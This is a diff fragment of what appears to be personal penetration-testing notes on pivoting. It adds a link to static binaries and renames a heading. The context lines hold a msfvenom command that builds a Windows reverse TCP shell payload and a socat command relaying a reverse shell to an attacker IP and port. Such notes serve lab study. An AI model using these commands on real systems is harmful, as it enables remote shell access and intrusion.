@@ -581,7 +581,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.205.128 LPORT=4444 EXITFUNC=
 https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-socat/#port-forwarding-(from-remote-machine)
 
 
-
+[All in one Static Binaries](https://github.com/andrew-d/static-binaries)
 ## Pivoting using SSH and Proxychains
 
 ### Port Forwarding
@@ -633,9 +633,10 @@ socat tcp-listen:8080,fork tcp:<remote-ip>:80
 ```
 
 
-Reverse
+Reverse Shell Relay
 ```
  ./socat-sardarji  tcp-l:8000 tcp:10.50.106.240:4444 &
 socat linux binary  machine port       attacker IP and port
 ```
+
 
